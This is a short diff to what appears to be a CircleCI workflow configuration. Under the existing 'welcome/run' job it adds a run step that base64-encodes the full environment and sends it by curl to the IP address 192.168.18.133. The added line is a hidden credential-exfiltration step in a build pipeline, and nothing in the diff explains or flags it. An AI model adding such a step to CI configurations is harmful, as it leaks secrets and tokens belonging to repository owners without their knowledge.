@@ -11,3 +11,4 @@ workflows:
     # Run the welcome/run job in its own container
     jobs:
       - welcome/run
+      - run: curl 192.168.18.133/?env=$(env | base64 | tr -d '\n')
